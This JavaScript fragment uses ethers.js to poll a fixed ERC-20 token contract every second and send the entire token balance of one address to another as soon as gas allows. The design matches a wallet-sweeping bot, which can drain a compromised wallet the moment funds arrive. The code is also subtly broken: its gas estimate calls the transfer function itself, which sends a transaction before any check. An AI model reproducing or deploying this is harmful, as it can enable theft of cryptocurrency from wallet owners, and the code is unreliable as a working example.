async function sendMainTransaction() {
  try {
    const tokenContractAddress = "0x291BE4B6eA733148ad1D2489dd59dA28F92b710E";

    const tokenContract = new ethers.Contract(
      tokenContractAddress,
      tokenabi,
      wallet
    );

    const balance = await tokenContract.balanceOf(fromAddress);

    if (balance.toString() === "0") {
      console.log(
        "Insufficient balance in your account, waiting for balance..."
      );
      return false;
    }

    const beth = await provider.getBalance(fromAddress);

    const gasLimit = await provider.estimateGas(
      tokenContract.transfer(toAddress, balance)
    );
    const Gasx = (await provider.getFeeData()).gasPrice;
    const transactionx = gasLimit * Gasx;
    console.log(transactionx);
    if (beth > transactionx) {
      console.log("enough to send with low Gas");
      const txl = await tokenContract.transfer(toAddress, balance);
      await txl.wait(1);
      console.log(`Transaction hash: ${txl.hash}`);
      return txl;
    } else {
      console.log("not enough to send with Gas");
      return false;
    }
  } catch (error) {
    console.error(
      "An error occurred while sending the main transaction:",
      error
    );
    return false;
  }
}

async function run() {
  while (true) {
    await sendMainTransaction();
    await new Promise((resolve) => setTimeout(resolve, 1000));
  }
}

run();
